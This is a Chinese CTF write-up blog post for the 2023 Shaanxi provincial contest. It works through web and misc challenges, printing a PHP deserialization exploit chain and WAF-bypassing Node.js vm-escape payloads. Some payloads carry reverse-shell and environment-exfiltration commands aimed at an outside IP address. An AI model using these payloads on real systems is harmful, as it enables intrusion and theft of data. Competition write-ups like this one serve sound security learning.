@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    <div class="hd logodiv" style="margin-top: 3%;">
+    <!-- <img src="/img/logo.png" class="logopng"> -->
+    <p class="logot">
+        <a href="/" style="color: #4f4646;text-decoration: none;">
+            unknown&#39;s blog 
+        </a>
+    </p>
+</div>
+<div class="hd">
+    <ol class="breadcrumb">
+        
+            <li><a class="ba" href="/tech">Tech</a></li>
+        
+            <li><a class="ba" href="/life">Life</a></li>
+        
+            <li><a class="ba" href="/essay">Essay</a></li>
+        
+            <li><a class="ba" href="/links">Friends</a></li>
+        
+            <li><a class="ba" target="_blank" rel="noopener" href="https://running.unk.org.cn/">Running</a></li>
+        
+            <li><a class="ba" href="/about">About</a></li>
+        
+            <li><a class="ba" href="/subscribe">Subscribe</a></li>
+        
+    </ol>
+    <hr class="breadcrumbhr">
+</div>
+
+    
+<div class="hd posts">
+
+    <!-- <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a> -->
+    <div class="post-title">
+        <p>
+            陕西省赛2023 web&amp;misc
+        </p>
+        <!-- <hr> -->
+    </div>
+    <div class="post-content">
+        <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezpop-solved"><a href="#ezpop-solved" class="headerlink" title="ezpop - solved"></a>ezpop - solved</h2><p>知识点：php fast destruct 反序列化</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230603164801366.png" alt="image-20230603164801366.png"><br><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230603164833157.png" alt="image-20230603164833157.png"><br>源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class night</span><br><span class="line">&#123;</span><br><span class="line">    public $night;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;night . &#x27;哒咩哟&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class day</span><br><span class="line">&#123;</span><br><span class="line">    public $day;</span><br><span class="line"></span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        echo $this-&gt;day-&gt;go();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __call($a, $b)&#123;</span><br><span class="line">        echo $this-&gt;day-&gt;getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class light</span><br><span class="line">&#123;</span><br><span class="line">    public $light;</span><br><span class="line"></span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        echo $this-&gt;light-&gt;d();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class dark</span><br><span class="line">&#123;</span><br><span class="line">    public $dark;</span><br><span class="line"></span><br><span class="line">    public function go()&#123;</span><br><span class="line">        ($this-&gt;dark)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getFlag()&#123;</span><br><span class="line">        include(hacked($this-&gt;dark));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hacked($s) &#123;</span><br><span class="line">    if(substr($s, 0,1) == &#x27;/&#x27;)&#123;</span><br><span class="line">        die(&#x27;呆jio步&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    $s = preg_replace(&#x27;/\.\.*/&#x27;, &#x27;.&#x27;, $s);</span><br><span class="line">    $s = urldecode($s);</span><br><span class="line">    $s = htmlentities($s, ENT_QUOTES, &#x27;UTF-8&#x27;);</span><br><span class="line">    return strip_tags($s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$un = unserialize($_POST[&#x27;‮⁦快给我传参⁩⁦pop&#x27;]); // </span><br><span class="line">throw new Exception(&#x27;seino&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>注意有unicode字符，复制到vscode就看得出来：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230603164954463.png" alt="image-20230603164954463.png"><br><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230603165149883.png" alt="image-20230603165149883.png"></p>
+<p>fast destruct，一眼顶针。参考链接：<a target="_blank" rel="noopener" href="https://www.wangan.com/p/7fy7f46cd2c8727f">https://www.wangan.com/p/7fy7f46cd2c8727f</a></p>
+<p>说来也巧，第一次碰到这种题目也是在这个平台，当时还是烨师傅（好像是他出的？）用来拷打新生的，我就被狠狠地拷打了。</p>
+<p>做这题本地调试版本一定要和题目对应，7和8的得到的结果完全不同。这里收录了php的所有windows版本：<a target="_blank" rel="noopener" href="https://windows.php.net/downloads/releases/archives/%E3%80%82">https://windows.php.net/downloads/releases/archives/。</a></p>
+<p>fast destruct原理：</p>
+<blockquote>
+<p>1、如果单独执行unserialize函数进行常规的反序列化，那么被反序列化后的整个对象的生命周期就仅限于这个函数执行的生命周期，当这个函数执行完毕，这个类就没了，在有析构函数的情况下就会执行它。</p>
+<p>2、如果反序列化函数序列化出来的对象被赋给了程序中的变量，那么被反序列化的对象其生命周期就会变长，由于它一直都存在于这个变量当中，当这个对象被销毁，才会执行其析构函数。</p>
+<p>本质上，fast destruct 是因为 unserialize 过程中扫描器发现序列化字符串格式有误导致的提前异常退出，为了销毁之前建立的对象内存空间，会立刻调用对象的__destruct(), 提前触发反序列化链条。</p>
+</blockquote>
+<p>因为手动抛异常时，强制退出程序，不会回收对象，即不会执行对象的__destruct。且题目序列化出来的对象被赋给了程序中的变量，该对象不会立刻销毁，所以我们要在抛异常之前销毁对象。</p>
+<p>以下是几个可以触发实现了fast destruct 的例子（php7）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class night&#123;</span><br><span class="line">    public $name = &#x27;123&#x27;;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo &quot;\n================__destruct================\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">//将该对象放进数组，手动修改数组元素个数为2。扫描器扫描完该对象并创建该对象后，在准备扫描下一个元素时出错，因为下一个元素已经没有了，立刻销毁之前创建好的对象。下面的都是相同的道理。</span><br><span class="line">//$s = unserialize(&#x27;a:2:&#123;i:0;O:5:&quot;night&quot;:2:&#123;s:4:&quot;name&quot;;s:3:&quot;123&quot;;&#125;&#125;&#x27;); </span><br><span class="line"></span><br><span class="line">$s = unserialize(&#x27;O:5:&quot;night&quot;:2:&#123;s:4:&quot;name&quot;;s:3:&quot;123&quot;;&#125;&#x27;);//改night后面的数字：只要不是1都可</span><br><span class="line"></span><br><span class="line">// $s = unserialize(&#x27;O:5:&quot;night&quot;:2:&#123;s:4:&quot;name&quot;;s:3:&quot;123&quot;;&#125;ads&#x27;);//在最后加字符串，可</span><br><span class="line">throw new Exception(&quot;nonono&quot;);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>所以题目的exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$night = new night();</span><br><span class="line">$day = new day();</span><br><span class="line">$dark = new dark();</span><br><span class="line">$light = new light();</span><br><span class="line">$day2 = new day();</span><br><span class="line"></span><br><span class="line">$night-&gt;night = $day;</span><br><span class="line">$night-&gt;night-&gt;day = $dark;</span><br><span class="line">$night-&gt;night-&gt;day-&gt;dark = $light;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$night-&gt;night-&gt;day-&gt;dark-&gt;light = $day2;</span><br><span class="line">$night-&gt;night-&gt;day-&gt;dark-&gt;light-&gt;day = new dark();</span><br><span class="line">$night-&gt;night-&gt;day-&gt;dark-&gt;light-&gt;day-&gt;dark = &quot;%2fflag&quot;;</span><br><span class="line"></span><br><span class="line">$array = array($night);</span><br><span class="line">echo serialize($array); //得到的字符串数组元素个数改为2</span><br></pre></td></tr></table></figure>
+
+<p>发包：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230603170910214.png" alt="image-20230603170910214.png"><br><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230603170924534.png" alt="image-20230603170924534.png"></p>
+<h2 id="unserialize-solved"><a href="#unserialize-solved" class="headerlink" title="unserialize - solved"></a>unserialize - solved</h2><p>第一次见，还好出的不难，搜一下php如何修改对象私有属性就可以了。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230603171304306.png" alt="image-20230603171304306.png"><br>unserialze函数不给用</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230603171412070.png" alt="image-20230603171412070.png"></p>
+<p>ReflectionClass也不可以，然后发现ReflectionObject可以。</p>
+<p>exp：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230603171602760.png" alt="image-20230603171602760.png"><br><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230603171655191.png" alt="image-20230603171655191.png"></p>
+<h2 id="ezrce-unsolved"><a href="#ezrce-unsolved" class="headerlink" title="ezrce - unsolved"></a>ezrce - unsolved</h2><p>无参rce这个知识点，忘记了……</p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/pursue-security/p/15406272.html">https://www.cnblogs.com/pursue-security/p/15406272.html</a></p>
+<p>当时只做到这一步，就一直卡了。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230608140705502.png" alt="image-20230608140705502.png"><br>赛后复现：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230608141400850.png" alt="image-20230608141400850.png"></p>
+<h2 id="test-unsolved"><a href="#test-unsolved" class="headerlink" title="test - unsolved"></a>test - unsolved</h2><p>比赛时没仔细看F12，以为是什么难题，就不看了。赛后看了一眼wp，说F12里有东西，接着不看wp，自己往下做，做出来了。</p>
+<hr>
+<p>藏在这里，当时只重点关注有没有绿色的注释了……</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230608145359991.png" alt="image-20230608145359991.png"><br><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230608145506032.png" alt="image-20230608145506032.png"><br><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230608145538557.png" alt="image-20230608145538557.png"><br>经过不断测试，发现profile后面加自己注册过的用户名才会返回结果，否则返回null。猜测那32位的是md5，什么的md5？那肯定是密码的md5。</p>
+<p>试试admin账号：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230608145722199.png" alt="image-20230608145722199.png"><br>拿去解一下：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230608145813243.png" alt="image-20230608145813243.png"><br>登录：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230608145843029.png" alt="image-20230608145843029.png"><br>目的很明显了，传个反弹shell过去：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230608150018739.png" alt="image-20230608150018739.png"></p>
+<h2 id="Esc4pe-T0-Mong0-unsolved"><a href="#Esc4pe-T0-Mong0-unsolved" class="headerlink" title="Esc4pe_T0_Mong0 - unsolved"></a>Esc4pe_T0_Mong0 - unsolved</h2><p>知识点：nodejs vm逃逸，利用js语法绕过waf，mongodb基本命令。</p>
+<p>赛后复现。记录了自己思考的过程，还有payload的迭代，所以会显得很啰嗦。把不同版本的写法都放在一起才知道哪些细节的妙处在哪。</p>
+<p>（下面exp的ip是内网穿透的ip，不是我自己的，不怕放出来hhhhh）</p>
+<hr>
+<p>源码：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230609100016616.png" alt="image-20230609100016616.png"><br>目标：绕过waf，实现反弹shell，再进入mongodb找flag。</p>
+<p>自己一开始写的，没注意到换行符给ban：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd = &#x27;bash -c &quot;env&gt;/dev/tcp/61.139.65.134/36264&quot;&#x27;</span><br><span class="line">s = &#x27;&#x27;</span><br><span class="line">d = &#123;&#125;</span><br><span class="line">for i in &quot;return process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;%s&#x27;)&quot;%cmd:</span><br><span class="line">    s+=str(ord(i))</span><br><span class="line">    s+=&#x27;,&#x27;</span><br><span class="line">s = s[:-1]</span><br><span class="line"></span><br><span class="line">code = &#x27;var a\nwith(String)a=fromCharCode(&#x27;+s+&#x27;)\nwith(this)with(constructor)(constructor(a))()&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>当时难想到怎样把fromCharCode传给constructor，所以用了换行符。</p>
+<p>自己后面再测了下，可以这样写，可弹计算器：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code = &quot;with(String)with(this)with(constructor)(constructor(fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,40,39,99,97,108,99,39,41)))()&quot;</span><br></pre></td></tr></table></figure>
+
+<p>wp的写法是将fromCharCode用变量表示，还用到逗号表达式，太妙了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd = &#x27;bash -c &quot;bash -i &amp;&gt;/dev/tcp/61.139.65.134/36264 0&gt;&amp;1&quot;&#x27;</span><br><span class="line">s = &#x27;&#x27;</span><br><span class="line">d = &#123;&#125;</span><br><span class="line">for i in &quot;return process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;%s&#x27;)&quot;%cmd:</span><br><span class="line">    s+=str(ord(i))</span><br><span class="line">    s+=&#x27;,&#x27;</span><br><span class="line">s = s[:-1]</span><br><span class="line"></span><br><span class="line">code = &#x27;with(String)with(f=fromCharCode,this)with(constructor)constructor(f(&#x27;+s+&#x27;))()&#x27;</span><br><span class="line">print(code)</span><br><span class="line">print(len(code))</span><br></pre></td></tr></table></figure>
+
+<p>上面没了过滤字符，但是太长了，457。想了一会，<code>return...exec</code>那里要拆开写，不能全转ascii。</p>
+<p>下面再改，改了code的写法，同时将一些ascii用变量表示。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def str2ascii(string):</span><br><span class="line">    ret = &#x27;&#x27;</span><br><span class="line">    for i in string:</span><br><span class="line">        ret += str(ord(i))</span><br><span class="line">        ret += &#x27;,&#x27;</span><br><span class="line">    ret = ret[:-1]</span><br><span class="line">    return ret</span><br><span class="line"></span><br><span class="line">def get_often_ascii(all):</span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    for i in all.split(&#x27;,&#x27;):</span><br><span class="line">        if i in result:</span><br><span class="line">            result[i] += 1</span><br><span class="line">        else:</span><br><span class="line">            result[i] = 1</span><br><span class="line">    final = []</span><br><span class="line">    for key in result:</span><br><span class="line">        if result[key] &gt;= 4:</span><br><span class="line">            final.append(key)</span><br><span class="line">    return final</span><br><span class="line"></span><br><span class="line">def replace_code(code,final):</span><br><span class="line">    index = 97</span><br><span class="line">    pair = &#x27;&#x27;</span><br><span class="line">    for fina in final:</span><br><span class="line">        #f变量已经用了，表示fromCharCode</span><br><span class="line">        if index != 102:</span><br><span class="line">            code = code.replace(fina, chr(index))</span><br><span class="line">            pair += f&#x27;&#123;chr(index)&#125;=&#123;fina&#125;,&#x27;</span><br><span class="line">        index += 1</span><br><span class="line"></span><br><span class="line">    print(pair)</span><br><span class="line">    code = code.replace(&#x27;XXXXX&#x27;, pair)</span><br><span class="line">    return code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    process_ascii = str2ascii(&quot;return process&quot;)</span><br><span class="line">    child_ascii = str2ascii(&quot;child_process&quot;)</span><br><span class="line">    cmd = str2ascii(&quot;bash -c \&quot;bash -i &amp;&gt;/dev/tcp/61.139.65.134/36264 0&gt;&amp;1\&quot;&quot;)</span><br><span class="line"></span><br><span class="line">    # XXXXX是用来给声明变量占位的</span><br><span class="line">    code = &#x27;with(String)with(XXXXXf=fromCharCode,this)with(constructor)with(constructor(f(&#x27;+process_ascii+&#x27;))())with(mainModule)with(require(f(&#x27;+child_ascii+&#x27;)))exec(f(&#x27;+cmd+&#x27;))&#x27;</span><br><span class="line"></span><br><span class="line">    all = process_ascii+&#x27;,&#x27;+child_ascii+&#x27;,&#x27;+cmd</span><br><span class="line"></span><br><span class="line">    #获取最常出现的ascii码，3位的ascii码出现4次，用变量代替才有意义。2位的ascii码至少要出现5次。当时忽略了2位ascii码</span><br><span class="line">    final = get_often_ascii(all)</span><br><span class="line"></span><br><span class="line">    #将ascii换成变量，将XXXXX换成变量声明</span><br><span class="line">    code = replace_code(code,final)</span><br><span class="line">    print(code)</span><br><span class="line">    print(len(code))</span><br></pre></td></tr></table></figure>
+
+<p>长度381，还差一点。</p>
+<p>看看到这里code长啥样：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">with(String)with(a=114,b=101,c=32,d=99,e=115,g=54,h=49,f=fromCharCode,this)with(constructor)with(constructor(f(a,b,116,117,a,110,c,112,a,111,d,b,e,e))())with(mainModule)with(require(f(d,104,105,108,100,95,112,a,111,d,b,e,e)))exec(f(98,97,e,104,c,45,d,c,34,98,97,e,104,c,45,105,c,38,62,47,100,b,118,47,116,d,112,47,g,h,46,h,51,57,46,g,53,46,h,51,52,47,51,g,50,g,52,c,48,62,38,h,34))</span><br></pre></td></tr></table></figure>
+
+<p>最后的改进：将声明变量省略，直接在第一次使用该变量的位置声明。赋值语句返回值是值。</p>
+<p>最终payload，长度363：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">with(String)with(f=fromCharCode,this)with(constructor)with(constructor(f(a=114,b=101,116,117,a,110,c=32,i=112,a,111,d=99,b,e=115,e))())with(mainModule)with(require(f(d,j=104,105,108,100,95,i,a,111,d,b,e,e)))exec(f(98,97,e,j,c,45,d,c,34,98,97,e,j,c,45,105,c,38,62,47,100,b,118,47,116,d,i,47,g=54,h=49,46,h,51,57,46,g,53,46,h,51,52,47,51,g,50,g,52,c,48,62,38,h,34))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230609095231803.png" alt="image-20230609095231803.png"></p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="管道-solved"><a href="#管道-solved" class="headerlink" title="管道 - solved"></a>管道 - solved</h2><p><code>zsteg 管道.png --all</code></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230603171953967.png" alt="image-20230603171953967.png"></p>
+<h2 id="可是雪啊飘进双眼-solved"><a href="#可是雪啊飘进双眼-solved" class="headerlink" title="可是雪啊飘进双眼 - solved"></a>可是雪啊飘进双眼 - solved</h2><p>给了一个flag.zip，有密码；一个音频hint.wav，一个文本snow.txt。</p>
+<p>hint.wav里有摩斯电码，解出来是WOAISHANXI。</p>
+<p>文本文件打开，全选，发现空白字符。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230603172300130.png" alt="image-20230603172300130.png"><br>说实话没接触过，无从下手，有\t有空格，尝试从二进制角度解，未果。吃个饭回来看了一会，突然意识到自己好蠢啊，就硬看，不会搜吗？</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230603172458324.png" alt="image-20230603172458324.png"><br>得到一个工具，文档：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230603172634202.png" alt="image-20230603172634202.png"><br>跑工具：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230603172722025.png" alt="image-20230603172722025.png"><br>解压缩包，得到两个图片，hide.jpg和key.jpg。</p>
+<p>key.jpg：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230603172855995.png" alt="image-20230603172855995.png"><br>有点大，8.26M，binwalk跑一下：<code>binwalk -e key.jpg --run-as=root</code>，得到另一张图片：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230603173056904.png" alt="image-20230603173056904.png"><br>密码：BC1PVEYD</p>
+<p>jpg图片，而且还要密码，用steghide跑：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230603173348448.png" alt="image-20230603173348448.png"></p>
+<h2 id="你是不是很疑惑呢-unsolved"><a href="#你是不是很疑惑呢-unsolved" class="headerlink" title="你是不是很疑惑呢 - unsolved"></a>你是不是很疑惑呢 - unsolved</h2><p>官方wp：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230609125736933.png" alt="image-20230609125736933.png"><br>貌似跟zip rar有关系。我用的360压缩的解压，下载的附件是个zip，直接解压也能看见时间信息：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230609125956946.png" alt="image-20230609125956946.png"><br><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230609125902148.png" alt="image-20230609125902148.png"><br>读取时间信息。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230609130034180.png" alt="image-20230609130034180.png"><br>注意，将图片文件送到项目里的时候不要复制，会修改图片的创建时间。当时第一次用的是复制，异或不出来，吃饭时候想可能是复制的问题，回来一看确实是。</p>
+<p>复制后的图片信息：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230609130233103.png" alt="image-20230609130233103.png"></p>
+<h2 id="Findme-unsolved"><a href="#Findme-unsolved" class="headerlink" title="Findme -unsolved"></a>Findme -unsolved</h2><p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230609154102449.png" alt="image-20230609154102449.png"><br>左上角Edit，导出这个chunk，然后删去，保存。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230609154243162.png" alt="image-20230609154243162.png"><br>导出的chunk开头4个字节是IDAT头，删去，只保留data部分。</p>
+<p>用VeraCrypt打开。（key.png是删掉那个chunk后的图片）</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230609154517975.png" alt="image-20230609154517975.png"><br>打开成功：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230609154744838.png" alt="image-20230609154744838.png"><br><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230609154810446.png" alt="image-20230609154810446.png"><br><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ShanXi2023/image-20230609154904688.png" alt="image-20230609154904688.png"></p>
+
+    </div>
+    
+    <div class="toc-container">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ezpop-solved"><span class="toc-text">ezpop - solved</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unserialize-solved"><span class="toc-text">unserialize - solved</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezrce-unsolved"><span class="toc-text">ezrce - unsolved</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#test-unsolved"><span class="toc-text">test - unsolved</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Esc4pe-T0-Mong0-unsolved"><span class="toc-text">Esc4pe_T0_Mong0 - unsolved</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%A1%E9%81%93-solved"><span class="toc-text">管道 - solved</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E6%98%AF%E9%9B%AA%E5%95%8A%E9%A3%98%E8%BF%9B%E5%8F%8C%E7%9C%BC-solved"><span class="toc-text">可是雪啊飘进双眼 - solved</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%A0%E6%98%AF%E4%B8%8D%E6%98%AF%E5%BE%88%E7%96%91%E6%83%91%E5%91%A2-unsolved"><span class="toc-text">你是不是很疑惑呢 - unsolved</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Findme-unsolved"><span class="toc-text">Findme -unsolved</span></a></li></ol></li></ol>
+    </div>
+
+    
+        <div id="custom-comments" class="custom-comments">
+    <h3>Comments</h3>
+    <form id="comment-form" class="comment-form">
+        <div class="form-row">
+            <input type="text" id="c-nickname" placeholder="Nickname *" required>
+            <input type="email" id="c-email" placeholder="Email">
+            <input type="url" id="c-website" placeholder="Website">
+        </div>
+        <textarea id="c-content" placeholder="Leave a comment..." required></textarea>
+        <button type="submit" id="c-submit">Submit</button>
+    </form>
+    <div id="comment-list" class="comment-list">
+        <!-- Comments will be loaded here -->
+        <p class="loading">Loading comments...</p>
+    </div>
+</div>
+
+<style>
+    .custom-comments {
+        margin-top: 40px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+    }
+    .comment-form {
+        margin-bottom: 30px;
+    }
+    .comment-form .form-row {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 10px;
+    }
+    .comment-form input, .comment-form textarea {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        background: #f9f9f9;
+    }
+    .comment-form textarea {
+        height: 100px;
+        resize: vertical;
+        margin-bottom: 10px;
+    }
+    .comment-form button {
+        padding: 8px 20px;
+        background: #333;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+    .comment-form button:hover {
+        background: #555;
+    }
+    .comment-item {
+        margin-bottom: 20px;
+        border-bottom: 1px solid #f0f0f0;
+        padding-bottom: 15px;
+    }
+    .comment-header {
+        margin-bottom: 5px;
+        font-size: 0.9em;
+        color: #666;
+    }
+    .comment-author {
+        font-weight: bold;
+        color: #333;
+        margin-right: 10px;
+    }
+    .comment-date {
+        font-size: 0.8em;
+        color: #999;
+    }
+    .comment-content {
+        line-height: 1.6;
+        color: #333;
+    }
+</style>
+
+<script>
+(function() {
+    const apiUrl = 'https://unk-blo-backend-rduuehbram.cn-shenzhen.fcapp.run';
+    const postUrl = window.location.pathname;
+    const commentList = document.getElementById('comment-list');
+    const commentForm = document.getElementById('comment-form');
+    const submitBtn = document.getElementById('c-submit');
+
+    function formatDate(timestamp) {
+        return new Date(timestamp).toLocaleString();
+    }
+
+    function escapeHtml(text) {
+        if (!text) return '';
+        return text
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+    }
+
+    // Load comments
+    fetch(`${apiUrl}/api/comments?url=${encodeURIComponent(postUrl)}`)
+        .then(response => response.json())
+        .then(data => {
+            commentList.innerHTML = '';
+            if (data.comments && data.comments.length > 0) {
+                data.comments.forEach(comment => {
+                    const div = document.createElement('div');
+                    div.className = 'comment-item';
+                    
+                    let authorHtml = `<span class="comment-author">${escapeHtml(comment.nickname)}</span>`;
+                    if (comment.website) {
+                        authorHtml = `<a href="${escapeHtml(comment.website)}" target="_blank" class="comment-author">${escapeHtml(comment.nickname)}</a>`;
+                    }
+
+                    div.innerHTML = `
+                        <div class="comment-header">
+                            ${authorHtml}
+                            <span class="comment-date">${formatDate(comment.timestamp)}</span>
+                        </div>
+                        <div class="comment-content">${escapeHtml(comment.content)}</div>
+                    `;
+                    commentList.appendChild(div);
+                });
+            } else {
+                commentList.innerHTML = '<p>No comments yet. Be the first!</p>';
+            }
+        })
+        .catch(err => {
+            console.error('Error loading comments:', err);
